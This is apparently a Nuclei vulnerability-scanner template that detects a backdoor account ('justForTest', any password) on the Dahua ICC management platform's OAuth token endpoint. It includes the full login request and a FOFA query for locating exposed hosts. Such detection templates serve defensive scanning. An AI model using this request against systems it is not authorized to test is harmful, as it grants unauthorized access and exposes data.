id: dahua-icc-backdoor-user

info:
  name: 大华 ICC 智能物联综合管理平台 后门账号 justForTest
  author: DhiyaneshDk
  severity: high
  description: |
    大华 ICC /evo-apigw/evo-oauth/oauth/token 可用 justForTest 任意密码登录，造成信息泄露。
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-1935899595"body="*客户端会小于800*"
  tags: dahua,exposure,backdoor,bypass,vuln

http:
  - raw:
      - |
        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":'
          - '"access_token":'
          - '"token_type":'
          - 'magicId'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'
